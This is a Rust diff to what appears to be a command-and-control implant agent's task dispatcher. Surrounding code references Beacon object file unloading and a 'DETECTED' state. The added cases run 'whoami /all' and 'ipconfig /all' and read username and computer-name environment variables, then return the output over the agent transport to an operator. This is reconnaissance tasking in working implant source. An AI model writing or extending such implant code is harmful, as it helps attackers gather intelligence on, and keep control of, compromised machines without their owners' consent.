@@ -1548,6 +1548,24 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &bof_store_unload(task.args.trim()), "");
         }
 
+        // ── Convenience shell commands ────────────────────────────────────────
+        "WHOAMI" => {
+            t.send_result(task.id, &shell("whoami /all"), "");
+        }
+        "IPCONFIG" => {
+            t.send_result(task.id, &shell("ipconfig /all"), "");
+        }
+        "USERNAME" | "USER" => {
+            let v = std::env::var("USERNAME")
+                .or_else(|_| std::env::var("USER"))
+                .unwrap_or_default();
+            t.send_result(task.id, &v, "");
+        }
+        "COMPUTERNAME" => {
+            let v = std::env::var("COMPUTERNAME").unwrap_or_default();
+            t.send_result(task.id, &v, "");
+        }
+
         // ── Agent state ───────────────────────────────────────────────────────
         "DETECTED" => {
             t.send_result(task.id, "[!] DETECTED flag acknowledged", "");
